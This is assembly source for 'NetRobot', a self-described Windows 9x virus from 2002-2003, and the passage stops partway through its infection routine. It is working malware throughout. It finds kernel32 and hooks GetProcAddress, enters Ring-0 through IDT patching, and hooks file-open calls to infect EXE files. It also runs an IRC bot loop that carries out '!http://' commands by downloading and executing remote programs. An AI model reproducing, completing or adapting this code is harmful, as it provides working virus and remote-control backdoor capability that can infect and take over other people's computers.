;  _   _      _   _____       _           _   
; | \ | |    | | |  __ \     | |         | |  
; |  \| | ___| |_| |__) |___ | |__   ___ | |_ 
; | . ` |/ _ \ __|  _  // _ \| '_ \ / _ \| __|
; | |\  |  __/ |_| | \ \ (_) | |_) | (_) | |_ 
; |_| \_|\___|\__|_|  \_\___/|_.__/ \___/ \__|
;             for Windows 95/98/Me
;                 (C) 2002-2003
;   by Underground, The Forbidden Knowledge
;
; * Compiled with MASM 6.14
; * Connects to selected IRC server
; * Allows downloading of files from HTTP servers
; * Creates a special interface for plug-ins
; * Infects EXE files during opening

.586p
.model flat, stdcall
option casemap: none

includelib \MASM32\LIB\KERNEL32.LIB

VERSION_MAJOR = 1
VERSION_MINOR = 6

CHECK_DELTA macro REGISTER
LOCAL target
	call target
target:
	pop REGISTER
	sub REGISTER, offset target
endm

DEBUG macro
	int 1
endm

.code

assume fs:NOTHING

entry_point:
	push ebp
	CHECK_DELTA ebp
	; Install exception handler (will catch an exception on NT/2000/XP)
	lea eax, BFF60000_exception[ebp]
	push ebp
	xor edx, edx
	push eax
	push dword ptr fs:[edx]
	mov fs:[edx], esp
	; Find KERNEL32.DLL in memory
	mov ebx, 0BFF60000h
	cmp word ptr [ebx], 'ZM'
	je kernel_found
try_BFF70000:
	lea eax, initialization_failed[ebp]
	mov ebx, 0BFF70000h
	xchg eax, [esp + 4]
	cmp word ptr [ebx], 'ZM'
	jne return_to_host
kernel_found:
	; Find the entry point of GetProcAddress
	mov edx, [ebx + 3ch]
	mov edx, [ebx + edx + 78h]
	add edx, ebx
	mov esi, [edx + 20h]
	mov ecx, [edx + 18h]
	add esi, ebx
find_GetProcAddress:
	lodsd
	add eax, ebx
	cmp dword ptr [eax - 1], ('teG' shl 8)
	jne continue_finding_GetProcAddress
	cmp dword ptr [eax + 3], 'corP'
	jne continue_finding_GetProcAddress
	cmp dword ptr [eax + 7], 'rddA'
	jne continue_finding_GetProcAddress
	cmp dword ptr [eax + 11], 'sse'
	je GetProcAddress_found
continue_finding_GetProcAddress:
	loop find_GetProcAddress
	jmp return_to_host
GetProcAddress_found:
	neg ecx
	add ecx, [edx + 18h]
	mov esi, [edx + 24h]
	add esi, ebx
	movzx eax, word ptr [esi + ecx*2]   ; read GetProcAddress index
	mov edi, [edx + 1ch]
	add edi, ebx   ; EDI = function address table (sorted by index)
	mov esi, [edi + eax*4]
	mov ecx, dword ptr [edi + 20]
	add esi, ebx
	add ecx, ebx
	push ecx       ; push address of VxDCall4
	; Check if we are already running
	push 'NETR'
	xor edx, edx
	push edx
	call esi
	test eax, eax
	jnz return_to_host
	; Allocate shared memory pages
	lea eax, N_VirtualAlloc[ebp]
	push eax
	push ebx
	call esi
	push 40h        ; PAGE_EXECUTE_READWRITE
	push 08001000h  ; MEM_COMMIT or VA_SHARED
	push VIRUS_TOTAL_SIZE
	push 0
	call eax
	; Copy virus code
	push esi
	xchg eax, edi
	lea esi, entry_point[ebp]
	mov ebp, edi
	mov ecx, ((VIRUS_CODE_SIZE + 3) / 4)
	sub ebp, offset entry_point
	rep movsd
	lea eax, relocation_jump[ebp]
	jmp eax
relocation_jump:
	lea eax, initialized_data_block[ebp]
	mov dl, [eax - 1]
	call crypt_data
	pop esi
	pop VxDCall4[ebp]
	mov GetProcAddress[ebp], esi
	; Hook GetProcAddress to allow modules call virus code
	cmp dword ptr [esi], 02b226a57h
	jne return_to_host
	cmp byte ptr [esi + 4], 0d2h
	jne return_to_host
	mov eax, esi
	lea ecx, [esi + 4 + 4096]
	shr eax, 12     ; EAX = page index of first byte of GetProcAddress code
	shr ecx, 12     ; ECX = 1 + page index of fifth byte of GetProcAddress code
	push 20060000h  ; <current rights> or PC_STATIC or PC_USER or PC_WRITEABLE
	sub ecx, eax
	push 0          ; <current rights> and not 0
	push ecx        ; number of pages to modify permissions of
	push eax        ; index of first page
	push 0001000dh  ; _PageModifyPermissions
	call dword ptr VxDCall4[ebp]
	lea eax, GetProcAddress_hook[ebp - 5]
	sub eax, esi
	mov [esi + 1], eax         ; assemble far
	mov byte ptr [esi], 0e9h   ; JMP instruction
	; Find entry points of required API functions
	lea esi, first_kernel_import_name[ebp]
	mov cl, NUMBER_OF_KERNEL_IMPORTS
	lea edi, first_kernel_import_address[ebp]
get_next_address:
	push ecx
	push esi        ; lpProcName
	push ebx        ; hModule == kernel
	call dword ptr GetProcAddress[ebp]
	pop ecx
	stosd           ; save retrieved address in [EDI]
	dec cl
	mov eax, [eax]  ; would cause a GPF if eax == 0
	jz got_all_addresses
	; skip to next function name
	xchg esi, edi
	push ecx
	xor al, al
	or ecx, -1
	repnz scasb
	pop ecx
	xchg esi, edi
	jmp get_next_address
got_all_addresses:
	; initialize main virus thread
	lea eax, virus_thread[ebp]
	call create_kernel_thread
return_to_host:
	xor edx, edx
	mov esp, fs:[edx]
	pop dword ptr fs:[edx]
	pop ecx
	pop eax
	pop ebp
	add eax, 12345678h
ENTRY_POINT_DELTA = ($ - 4)
	push eax
	ret
BFF60000_exception:
	; execution goes here if [0BFF60000h] is not readable
	call restore_context
	nop	; MkS_Vir db polled -- this makes a new variant ;>
	jmp try_BFF70000
initialization_failed:
	; general exception handler for initialization time
	call restore_context
	jmp return_to_host

; "call restore_context" returns to program
; after an exception handler is entered
restore_context:
	pop ecx               ; ECX = return address
	mov eax, [esp + 12]   ; EAX = pointer to program context structure
	mov [eax + 184], ecx  ; modify EIP
	xor eax, eax          ; reload context & go on
restore_context_ret:
	ret

; sets up random nickname
; input: none
; output: none
; registers destroyed: EAX ECX EDX EDI
select_random_nick:
	lea eax, m_nick[ebp]
	push 0
	push 5
	push eax
	push dword ptr irc_socket[ebp]
	call dword ptr send[ebp]
	cmp al, 5
	jne restore_context_ret
	call send_random
	jne restore_context_ret
	mov my_nick[ebp], ecx
	mov my_nick[ebp + 4], edx
	push 10
	mov eax, esp
	push 0
	push 1
	push eax
	push dword ptr irc_socket[ebp]
	call dword ptr send[ebp]
	pop ecx
	cmp al, 1
	ret

; sends 8 random letters to the IRC server
; input: none
; output: none
; registers destroyed: EAX ECX EDX EDI
send_random:
	push 0
	push 0
	mov cl, 8
	mov edi, esp
send_random_loop:
	imul edx, RandSeed[ebp], 08088405h
	xor eax, eax
	inc edx
	mov al, 26
	mov RandSeed[ebp], edx
	mul edx
	lea eax, [edx + 'a']
	stosb
	dec cl
	jnz send_random_loop
	sub edi, 8
	push 0
	push 8
	push edi
	push dword ptr irc_socket[ebp]
	call dword ptr send[ebp]
	pop ecx
	pop edx
	cmp al, 8
send_random_ret:
	ret

download_thread:
	push ebp
	push esi
	push edi
	CHECK_DELTA ebp
	mov edi, [esp + 16]
	sub esp, 512
	xor ebx, ebx
	; Receive HTTP header
http_recv_loop:
	mov esi, esp
	push 2	; MSG_PEEK
	push 512
	push esi
	push edi
	call dword ptr recv[ebp]
	test eax, eax
	jz exit_download_thread
	js exit_download_thread
	xchg eax, ecx
http_look_for_crlf:
	lodsb
	cmp al, 13
	je http_crlf_found
	cmp al, 10
	je http_crlf_found
	loop http_look_for_crlf
http_wait_for_header_data:
	sub esi, esp
http_wait_loop:
	push eax
	push esp
	push 4004667fh	; FIONREAD
	push edi
	call dword ptr ioctlsocket[ebp]
	pop ecx
	test eax, eax
	jnz exit_download_thread
	cmp ecx, esi
	jne http_recv_loop
	push 75
	call dword ptr Sleep[ebp]
	jmp http_wait_loop
http_crlf_found:
	sub esi, esp
	mov eax, esp
	push 0
	push esi
	push eax
	push edi
	call dword ptr recv[ebp]
	cmp eax, esi
	jne exit_download_thread
	test ebx, ebx
	jz check_for_header_end
	mov esi, esp
	lodsd
	cmp eax, 'PTTH'
	jne exit_download_thread
	lodsb
	cmp al, '/'
	jne exit_download_thread
http_look_for_whitespace:
	lodsb
	test al, al
	jz exit_download_thread
	cmp al, ' '
	jne http_look_for_whitespace
	lodsd
	cmp eax, ' 002'
	jne exit_download_thread
	or bl, 1
	jmp http_recv_loop
check_for_header_end:
	cmp byte ptr [esp], 13
	jne http_recv_loop
	mov eax, esp
	push 0
	push 1
	push eax
	push edi
	call dword ptr recv[ebp]
	cmp al, 1
	jne exit_download_thread
	; Generate temporary file name
	push esp
	push 250
	call dword ptr GetTempPathA[ebp]
	mov ecx, esp
	lea esi, [esp + 256]
	push 'RTN'
	mov edx, esp
	push esi
	push 0
	push edx
	push ecx
	call dword ptr GetTempFileNameA[ebp]
	pop edx
	; open local file
	xor ecx, ecx
	push ecx
	push ecx
	push 2	; CREATE_ALWAYS
	push ecx
	push ecx
	push 40000000h	; GENERIC_WRITE
	push esi
	call dword ptr CreateFileA[ebp]
	cmp eax, -1
	je exit_download_thread
	; write incoming bytes to the file
	xchg eax, ebx
	mov esi, esp
http_download_loop:
	push 0
	push 256
	push esi
	push edi
	call dword ptr recv[ebp]
	test eax, eax
	js finish_download
	jz finish_download
	push eax
	mov ecx, esp
	push 0
	push ecx
	push eax
	push esi
	push ebx
	call dword ptr WriteFile[ebp]
	pop ecx
	test eax, eax
	jnz http_download_loop
finish_download:
	push ebx
	call dword ptr CloseHandle[ebp]
	; execute downloaded program
	xchg esi, edi
	push esp
	xor ecx, ecx
	lea edi, [esp + 20]
	mov cl, 17
	push edi
	xor eax, eax
	rep stosd
	mov edi, [esp]
	lea edx, [esp + 264]
	mov byte ptr [edi], 68
	inc byte ptr [edi + 48]
	mov cl, 7
CreateProcess_push_arguments:
	push 0
	loop CreateProcess_push_arguments
	push edx
	call dword ptr CreateProcessA[ebp]
	xchg esi, edi
exit_download_thread:
	add esp, 512
	push edi
	call dword ptr closesocket[ebp]
	pop edi
	pop esi
	pop ebp
	ret 4

download_and_install:
	; split host and path part
	mov ebx, esi
find_slash:
	lodsb
	cmp al, 13
	je send_random_ret
	cmp al, 10
	je send_random_ret
	cmp al, '/'
	jne find_slash
	mov byte ptr [esi - 1], 0
	; resolve host -> ip
	push ebx
	call dword ptr gethostbyname[ebp]
	test eax, eax
	jz download_error
	mov eax, [eax + 12]
	mov eax, [eax]
	mov edi, [eax]
	; connect to HTTP server
	xor eax, eax
	push eax
	inc eax
	push eax
	inc eax
	push eax
	call dword ptr socket[ebp]
	cmp eax, -1
	je download_error
	push edi
	push 50000002h
	xchg eax, edi
	mov edx, esp
	push 16
	push edx
	push edi
	call dword ptr connect[ebp]
	sub esp, -8
	test eax, eax
	jnz close_and_download_error
	; send HTTP GET request
	mov al, '/'
	push eax
	push ' TEG'
	mov edx, esp
	push 0
	push 5
	push edx
	push edi
	call dword ptr send[ebp]
	sub esp, -8
	cmp al, 5
	jne close_and_download_error
	push edi
	mov edi, esi
	mov al, 13
	or ecx, -1
	repne scasb
	sub edi, esi
	lea ecx, [edi - 1]
	pop edi
	push 0
	push ecx
	push esi
	push edi
	xchg esi, ecx
	call dword ptr send[ebp]
	cmp eax, esi
	jne close_and_download_error
	lea eax, http_handshake[ebp]
	push 0
	push HTTP_HANDSHAKE_LENGTH
	push eax
	push edi
	call dword ptr send[ebp]
	cmp al, HTTP_HANDSHAKE_LENGTH
	jne close_and_download_error
	push edi
	mov edi, ebx
	xor al, al
	or ecx, -1
	repne scasb
	sub edi, ebx
	lea ecx, [edi - 1]
	pop edi
	push 0
	push ecx
	push ebx
	push edi
	xchg ebx, ecx
	call dword ptr send[ebp]
	cmp eax, ebx
	jne close_and_download_error
	push 0a0d0a0dh
	mov edx, esp
	push 0
	push 4
	push edx
	push edi
	call dword ptr send[ebp]
	pop ecx
	cmp al, 4
	jne close_and_download_error
	; do the rest from within a separate thread
	push eax
	push esp
	push 0
	lea eax, download_thread[ebp]
	push edi
	push eax
	push 0
	push 0
	call dword ptr CreateThread[ebp]
	mov [esp], eax
	call dword ptr CloseHandle[ebp]
	xor eax, eax
	ret
close_and_download_error:
	push edi
	call dword ptr closesocket[ebp]
download_error:
	lea eax, download_failed[ebp]
	push 0
	push DOWNLOAD_FAILED_LENGTH
	push eax
	push dword ptr irc_socket[ebp]
	call dword ptr send[ebp]
	cmp al, DOWNLOAD_FAILED_LENGTH
	ret

send_join:
	lea eax, m_join[ebp]
	push 0
	push JOIN_LENGTH
	push eax
	push dword ptr irc_socket[ebp]
	call dword ptr send[ebp]
	cmp al, JOIN_LENGTH
	ret

virus_thread:
	push ebp
	CHECK_DELTA ebp
	; Finalize setup - hook VxDCall PM callback (BlackBat method)
	mov esi, VxDCall4[ebp]
	mov ecx, 30
scan_for_callback:
	lodsb
	cmp al, 2eh
	jne continue_scanning
	cmp word ptr [esi], 1dffh
	jne continue_scanning
	lea edi, old_VxDCall_int30_callback[ebp]
	mov esi, [esi + 2]
	push edi
	mov VxDCall_int30_call_address[ebp], esi
	movsd
	movsw
	pop edi
	lea eax, VxDCall_int30_hook[ebp]
	mov VxDCall_int30_hook_jmp[ebp], edi
	cli
	mov [esi - 6], eax
	mov [esi - 2], cs
	sti
	jmp callback_installed
continue_scanning:
	loop scan_for_callback
callback_installed:
	; initialize random numbers generator
	add esp, -24
	push esp
	call dword ptr GetSystemTime[ebp]
	movzx eax, byte ptr [esp + 8]
	imul eax, eax, 60
	add ax, [esp + 10]
	imul eax, eax, 60
	movzx edx, word ptr [esp + 12]
	add eax, edx
	imul eax, eax, 1000
	mov dx, [esp + 14]
	add eax, edx
	mov RandSeed[ebp], eax
	lea eax, WinSock[ebp]
	sub esp, -24
	; Find entry points of required WinSock functions
	push eax
	call dword ptr LoadLibraryA[ebp]
	xchg eax, ebx
	lea esi, first_winsock_import_name[ebp]
	mov cl, NUMBER_OF_WINSOCK_IMPORTS
	lea edi, first_winsock_import_address[ebp]
winsock_get_next_address:
	push ecx
	push esi        ; lpProcName
	push ebx        ; hModule == wsock32
	call dword ptr GetProcAddress[ebp]
	pop ecx
	test eax, eax
	jz exit_virus_thread
	stosd           ; save retrieved address in [EDI]
	dec cl
	jz winsock_got_all_addresses
	; skip to next function name
	xchg esi, edi
	push ecx
	xor al, al
	or ecx, -1
	repnz scasb
	pop ecx
	xchg esi, edi
	jmp winsock_get_next_address
winsock_got_all_addresses:
	sub esp, 400
	push esp
	push 0101h
	call dword ptr WSAStartup[ebp]
	add esp, 400
	test eax, eax
	jnz exit_virus_thread
	lea eax, local_host[ebp]
	push 63
	push eax
	call dword ptr gethostname[ebp]
	inc byte ptr initialized[ebp]
connection_loop:
	lea eax, local_host[ebp]
	push eax
	call dword ptr gethostbyname[ebp]
	mov esi, [eax + 12]
check_next_ip:
	lodsd
	mov edx, [eax]
	test edx, edx
	jz no_internet_connection
	cmp edx, 7f000001h
	je check_next_ip
	; socket(PF_INET, SOCK_STREAM, 0)
	xor eax, eax
	push eax
	inc eax
	push eax
	inc eax
	push eax
	call dword ptr socket[ebp]
	cmp eax, -1
	je no_internet_connection
	mov irc_socket[ebp], eax
	; build struct sockaddr_in on stack
	push dword ptr irc_server[ebp]
	push 0b1a0002h  ; htons(6667), AF_INET
	; connect(irc_socket, sockaddr, sizeof(sockaddr))
	mov edx, esp
	push 16
	push edx
	push eax
	call dword ptr connect[ebp]
	add esp, 8
	test eax, eax
	jnz close_connection
	; connection registration
	lea eax, m_user[ebp]
	push 0
	push 5
	push eax
	push dword ptr irc_socket[ebp]
	call dword ptr send[ebp]
	cmp al, 5
	jne close_connection
	call send_random
	jne close_connection
	lea eax, m_user2[ebp]
	push 0
	push 6
	push eax
	push dword ptr irc_socket[ebp]
	call dword ptr send[ebp]
	cmp al, 6
	jne close_connection
	call send_random
	jne close_connection
	push 10
	mov eax, esp
	push 0
	push 1
	push eax
	push dword ptr irc_socket[ebp]
	call dword ptr send[ebp]
	pop edx
	cmp al, 1
	jne close_connection
	call select_random_nick
	jne close_connection
	sub esp, 512
recv_loop:
	; check socket receive buffer
	mov edi, esp
	push 2   ; MSG_PEEK
	push 512
	push edi
	push dword ptr irc_socket[ebp]
	call dword ptr recv[ebp]
	test eax, eax
	jz free_recvbuf
	js free_recvbuf
	; look for CRLF
	xchg eax, ecx
find_crlf:
	mov al, [edi]
	inc edi
	cmp al, 13
	je crlf_found
	cmp al, 10
	je crlf_found
	loop find_crlf
	jmp wait_for_data
crlf_found:
	sub edi, esp
	mov esi, esp
	; remove packet from the receive buffer
	push 0
	push edi
	push esi
	push dword ptr irc_socket[ebp]
	call dword ptr recv[ebp]
	cmp eax, edi
	jne free_recvbuf
	; call IRC hook
	.if dword ptr irc_hook[ebp] != 0
		call dword ptr irc_hook[ebp]
	.endif
	; skip prefix, if there is any
	cmp byte ptr [esi], ':'
	jne no_prefix
	inc esi
skip_prefix:
	lodsb
	cmp al, 13
	je recv_loop
	cmp al, 10
	je recv_loop
	cmp al, ' '
	jne skip_prefix
no_prefix:
	lodsd
	.if eax == ' 100'
		call send_join
		jne free_recvbuf
	.elseif eax == ' 234' || eax == ' 334' || eax == ' 734'
		call select_random_nick
		jne free_recvbuf
	.elseif eax == 'KCIK'
		lodsb
		cmp al, ' '
		jne recv_loop
	skip_channel:
		lodsb
		cmp al, 13
		je recv_loop
		cmp al, 10
		je recv_loop
		cmp al, ' '
		jne skip_channel
		xor ecx, ecx
		lea edi, my_nick[ebp]
		mov cl, 2
		repe cmpsd
		jne recv_loop
		lodsb
		cmp al, ' '
		jne recv_loop
		mov initialized[ebp], 1
		call send_join
		jne free_recvbuf
	.elseif eax == 'GNIP'
		lodsb
		cmp al, ' '
		jne recv_loop
		mov eax, esp
		mov byte ptr [eax + 1], 'O'
		push 0
		push edi
		push eax
		push dword ptr irc_socket[ebp]
		call dword ptr send[ebp]
		cmp eax, edi
		jne free_recvbuf
		cmp initialized[ebp], 1
		jne recv_loop
		call send_join
		jne free_recvbuf
	.elseif eax == 'NIOJ'
		lodsb
		cmp al, ' '
		jne recv_loop
		mov initialized[ebp], 2
	.elseif eax == 'VIRP'
		lodsd
		cmp eax, ' GSM'
		jne recv_loop
	skip_target:
		lodsb
		cmp al, 13
		je recv_loop
		cmp al, 10
		je recv_loop
		cmp al, ' '
		jne skip_target
		lodsb
		cmp al, ':'
		jne recv_loop
		lodsd
		cmp eax, 'eid!'
		je shutdown_virus
		cmp eax, 'tth!'
		jne recv_loop
		lodsd
		cmp eax, '//:p'
		jne recv_loop
		call download_and_install
		jne free_recvbuf
	.endif
	jmp recv_loop
wait_for_data:
	; that's nasty, but code size is the reason
	sub edi, esp
	push 75
	call dword ptr Sleep[ebp]
	push eax
	push esp
	push 4004667fh  ; FIONREAD
	push dword ptr irc_socket[ebp]
	call dword ptr ioctlsocket[ebp]
	pop ecx
	test eax, eax
	jnz free_recvbuf
	cmp ecx, edi
	je wait_for_data
	jmp recv_loop
free_recvbuf:
	add esp, 512
close_connection:
	or eax, -1
	xchg irc_socket[ebp], eax
	push eax
	call dword ptr closesocket[ebp]
no_internet_connection:
	xor eax, eax
	mov irc_socket[ebp], eax
	mov initialized[ebp], 1
	push 45000
	call dword ptr Sleep[ebp]
	jmp connection_loop
exit_virus_thread:
	pop ebp
	ret 4

uninstaller_thread:
	push ebp
	CHECK_DELTA ebp
	; uninstall VxDCall hook
	mov eax, VxDCall_int30_call_address[ebp]
	mov ecx, dword ptr old_VxDCall_int30_callback[ebp]
	mov dx, word ptr old_VxDCall_int30_callback[ebp + 4]
	cli
	mov [eax], ecx
	mov [eax + 4], dx
	sti
	; kill virus thread - unsafe, like most of virus code
	push eax
	push virus_thread_handle[ebp]
	call dword ptr TerminateThread[ebp]
	push virus_thread_handle[ebp]
	call dword ptr CloseHandle[ebp]
	; close IRC connection
	.if irc_socket[ebp] != 0
		push irc_socket[ebp]
		call dword ptr closesocket[ebp]
	.endif
	; uninstall GetProcAddress hook
	mov eax, GetProcAddress[ebp]
	cli
	mov dword ptr [eax], 2b226a57h
	mov byte ptr [eax + 4], 0d2h
	sti
	mov initialized[ebp], 0
	pop ebp
	ret 4

VxDCall_int30_hook:
	pushad
	CHECK_DELTA ebp
	cmp lock_count[ebp], 0         ; is auto-infection locked?
	jg exit_VxDCall_int30_hook
	cmp eax, 002a0010h             ; VWIN32_Int21Dispatch?
	jne exit_VxDCall_int30_hook
	cmp word ptr [esp + 44], 716ch ; LFN Extended Open/Create?
	jne exit_VxDCall_int30_hook
	cmp infector_busy[ebp], 0      ; check infector semaphore
	jg exit_VxDCall_int30_hook
	; Is it an .EXE file?
	lea edi, file_name_buffer[ebp]
	cld
	or ecx, -1
	mov ebx, edi
copy_file_name:
	lodsb
	.if al >= 'a' && al <= 'z'
		sub al, 32
	.endif
	stosb
	.if al == '\' || al == '/'
		mov ebx, edi
	.endif
	inc ecx
	test al, al
	jnz copy_file_name
	cmp ecx, 4
	jl exit_VxDCall_int30_hook
	cmp dword ptr [edi - 5], 'EXE.'
	jne exit_VxDCall_int30_hook
	cmp dword ptr [ebx], 'UTES'
	je exit_VxDCall_int30_hook
	cmp dword ptr [ebx], 'TSNI'
	je exit_VxDCall_int30_hook
	cmp dword ptr [ebx], 'CNIW'
	je exit_VxDCall_int30_hook
	cmp dword ptr [ebx], 'NUCW'
	je exit_VxDCall_int30_hook
	cmp dword ptr [ebx], '23CW'
	je exit_VxDCall_int30_hook
	cmp dword ptr [ebx], 'OTSP'
	jne infect_this_file
	cmp dword ptr [ebx + 4], '.SER'
	je exit_VxDCall_int30_hook
infect_this_file:
	lea esi, file_name_buffer[ebp]
	call do_infect_file
exit_VxDCall_int30_hook:
	popad
	jmp fword ptr cs:[12345678h]
VxDCall_int30_hook_jmp = ($ - 4)

; returns address of virus request handler entry point
; if hModule == 0 && lpProcName == (LPCSTR) 'NETR'
GetProcAddress_hook:
	CHECK_DELTA eax
	cmp dword ptr [esp + 4], 0
	jne return_to_original_GetProcAddress
	cmp dword ptr [esp + 8], 'NETR'
	jne return_to_original_GetProcAddress
	lea eax, virus_request_handler[eax]
	ret 8
return_to_original_GetProcAddress:
	mov eax, GetProcAddress[eax]
	add eax, 5
	push edi       ; these are
	push 22        ; the bytes
	sub edx, edx   ; we overwrote...
	jmp eax

; returns address of an exported virus routine
; input:
;   EAX = function index
; output:
;   EAX = function address or 0 (on failure)
; registers destroyed: EDX
virus_request_handler:
	CHECK_DELTA edx
	cmp byte ptr initialized[edx], 0
	je no_such_export
	cmp eax, NUMBER_OF_EXPORTS
	jnb no_such_export
	mov eax, virus_exports_list[edx + eax*4]
	add eax, edx
	ret
no_such_export:
	xor eax, eax
	ret

; returns NetRobot version
; input: none
; output:
;   EAX = version number (high word - major number)
; registers destroyed: none
virus_get_version:
	mov eax, ((VERSION_MAJOR shl 16) or VERSION_MINOR)
	ret

; injects into and spawns a new kernel32.dll thread
; input:
;   EAX = address of thread function
; output: none
; registers destroyed: ECX EDX
create_kernel_thread:
	push ebp
	push ebx
	push eax
	CHECK_DELTA ebp
	; Switch to Ring-0 (CIH method)
	push eax
	sidt fword ptr [esp - 2]
	pop ebx   ; EBX = IDT base
	lea eax, injected_code[ebp]
	lea ecx, ring0_entry_point[ebp]
	cli
	mov dl, [ecx]        ; load the code from swap
	mov dl, [ecx + (injected_code - ring0_entry_point) - 1]
	mov dx, [ebx + 46]
	shl edx, 16
	mov dx, [ebx + 40]   ; EDX = original INT 5 vector
	mov [ebx + 40], cx   ; modify
	shr ecx, 16          ; INT 5
	mov [ebx + 46], cx   ; vector
	xchg ebx, [esp]
	int 5
	xchg ebx, [esp]
	mov [ebx + 40], dx   ; _QueueUserAPC doesn't change EDX nor EBX
	shr edx, 16
	mov [ebx + 46], dx
	sti
	; Unsnap direct CALL
	mov dword ptr _QueueUserAPC[ebp], 002420cdh
	mov word ptr _QueueUserAPC[ebp + 4], 002ah
	pop eax
	pop ebx
	pop ebp
	ret
ring0_entry_point:
	; execution goes here after "int 5"
	push -1    ; kernel service thread
	push ebx   ; parameter - address of thread function
	push eax   ; procedure - injected_code
_QueueUserAPC:
	int 20h       ; VMMCall
	dd 002a0024h  ; _QueueUserAPC
	add esp, 12   ; pop arguments from the stack
	iretd      ; return from the interrupt handler
injected_code:
	; At this point, we are already in kernel32.dll
	CHECK_DELTA edx
	mov eax, [esp + 4]  ; EAX = address of a thread function
	push edx
	push 0     ; allocate space on stack for thread id
	push esp   ; lpThreadId
	push 0     ; dwCreationFlags
	push 0     ; lpParameter
	push eax   ; lpStartAddress
	push 0     ; dwStackSize
	push 0     ; lpThreadAttributes
	call dword ptr CreateThread[edx]
	mov edx, [esp + 4]
	.if virus_thread_handle[edx] == 0
		; save the handle if this is *our* main thread
		mov virus_thread_handle[edx], eax
		pop eax
	.else
		mov [esp], eax
		call dword ptr CloseHandle[edx]
	.endif
	pop eax
	ret 4

; encrypts/decrypts an initialized data block in memory
; input:
;   EAX = offset of initialized data block
;   DL  = encryption key
; output: none
; registers destroyed: EAX ECX EDX
crypt_data:
	mov dh, dl
	mov ecx, INITIALIZED_DATA_SIZE
crypt_data_loop:
	xor byte ptr [eax], dl
	inc eax
	add dl, dh
	loop crypt_data_loop
	ret

; opens a file and creates a memory map for it
; input:
;   EBX = number of bytes after EOF to be mapped
; output: ZF set on error
; registers destroyed: EAX ECX EDX
open_and_map_file:
	; clear file attributes
	push file_name[ebp]
	call dword ptr GetFileAttributesA[ebp]
	cmp eax, -1
	je return_zf_set
	mov file_attributes[ebp], eax
	push 0
	push file_name[ebp]
	call dword ptr SetFileAttributesA[ebp]
	test eax, eax
	jz return_zf_set
	; open the file in R/W mode
	xor ecx, ecx
	push ecx
	push ecx
	push 3	; OPEN_EXISTING
	push ecx
	push 1	; FILE_SHARE_READ
	push 0c0000000h		; GENERIC_READ | GENERIC_WRITE
	push file_name[ebp]
	call dword ptr CreateFileA[ebp]
	cmp eax, -1
	je restore_file_attributes
	mov file_handle[ebp], eax
	; save file time
	lea ecx, file_last_write_time[ebp]
	lea edx, file_last_access_time[ebp]
	push ecx
	push edx
	push 0
	push eax
	call dword ptr GetFileTime[ebp]
	test eax, eax
	jz close_file_without_truncate
	; obtain file size
	push 0
	push file_handle[ebp]
	call dword ptr GetFileSize[ebp]
	cmp eax, -1
	je close_file
	mov file_size[ebp], eax
	; create file mapping
	xor ecx, ecx
	add eax, ebx
	push ecx
	push eax
	push ecx
	push 4	; PAGE_READWRITE
	push ecx
	push file_handle[ebp]
	call dword ptr CreateFileMappingA[ebp]
	test eax, eax
	jz close_file
	xor ecx, ecx
	mov file_mapping_handle[ebp], eax
	; map view of file in virtual address space
	push ecx
	push ecx
	push ecx
	push 000f001fh	; FILE_MAP_ALL_ACCESS
	push eax
	call dword ptr MapViewOfFile[ebp]
	test eax, eax
	jz close_file_mapping
	mov file_base[ebp], eax
	ret

; closes a mapped file
; input:
;   EBX = new file size (0 if no change)
; output: ZF set
; registers destroyed: EAX ECX EDX
unmap_and_close_file:
	push file_base[ebp]
	call dword ptr UnmapViewOfFile[ebp]
close_file_mapping:
	push file_mapping_handle[ebp]
	call dword ptr CloseHandle[ebp]
	lea eax, file_last_write_time[ebp]
	lea ecx, file_last_access_time[ebp]
	push eax
	push ecx
	push 0
	push file_handle[ebp]
	call dword ptr SetFileTime[ebp]
close_file:
	.if file_size[ebp] == 0
		push file_handle[ebp]
		call dword ptr SetEndOfFile[ebp]
	.endif
close_file_without_truncate:
	push file_handle[ebp]
	call dword ptr CloseHandle[ebp]
restore_file_attributes:
	push file_attributes[ebp]
	push file_name[ebp]
	call dword ptr SetFileAttributesA[ebp]
return_zf_set:
	xor eax, eax
	ret

; infects a PE executable
; input:
;   EAX = pointer to ASCIIZ string with file path
; output:
;   EAX = 1 if the file has been successfully infected,
;         0 if an error has occured,
;         -1 if the file is already infected
;         -2 try again (another infection in progress)
; registers destroyed: EAX ECX EDX
infect_file:
	push ebp
	push esi
	push edi
	push ebx
	CHECK_DELTA ebp
	xchg eax, esi
	call do_infect_file
	pop ebx
	pop edi
	pop esi
	pop ebp
	ret

calculate_increase:
	; calculate increase in virtual size
	mov ecx, [ebx + 38h]
	mov eax, (VIRUS_CODE_SIZE - 1)
	xor edx, edx
	add eax, ecx
	div ecx
	mul ecx
	mov virtual_increase[ebp], eax
	; calculate increase in file size
	mov ecx, [ebx + 3ch]
	mov eax, (VIRUS_CODE_SIZE - 1)
	xor edx, edx
	add eax, ecx
	div ecx
	mul ecx
	mov file_increase[ebp], eax
	ret

find_last_section:
	; find last section
	lea edx, [ebx + 18h]
	movzx eax, word ptr [ebx + 14h]
	add edx, eax
	movzx eax, word ptr [ebx + 6]
	test eax, eax
	jz find_last_section_error
	dec eax
	imul eax, eax, 40
	add edx, eax
	cmp dword ptr [edx], 'niw_'
	je find_last_section_error	; WinZip Self-Extractor
	mov eax, [edx + 20]		; PointerToRawData
	add eax, [edx + 16]		; SizeOfRawData
	cmp eax, file_size[ebp]			; additional data after end of image?
	jb find_last_section_error
	xor al, al
	ret
find_last_section_error:
	or al, -1
	ret

do_infect_file:
	.if infector_busy[ebp] > 0
		mov eax, -2
		ret
	.endif
	inc infector_busy[ebp]
	mov infector_result[ebp], 0
	mov file_name[ebp], esi
	; open file for infection
	xor ebx, ebx
	call open_and_map_file
	jz exit_infect_file
	; install exception handler (in case file has invalid format)
	lea eax, infection_exception[ebp]
	xor edx, edx
	push eax
	push dword ptr fs:[edx]
	mov fs:[edx], esp
	; check if the file can be infected
	cmp dword ptr file_size[ebp], 2097152
	jnb deinstall_exception_handler		; setup?..
	mov esi, file_base[ebp]
	cmp word ptr [esi], 'ZM'
	jne deinstall_exception_handler
	mov ebx, [esi + 3ch]
	add ebx, esi
	cmp dword ptr [ebx], 'EP'
	jne deinstall_exception_handler
	test dword ptr [ebx + 16h], 2000h
	jnz deinstall_exception_handler
	.if dword ptr [ebx + 58h] == 'RTEN'	; already infected? (CheckSum field)
		mov infector_result[ebp], -1
		jmp deinstall_exception_handler
	.endif
	call calculate_increase
	; re-open file (increasing its length)
	call unmap_and_close_file
	mov ebx, file_increase[ebp]
	call open_and_map_file
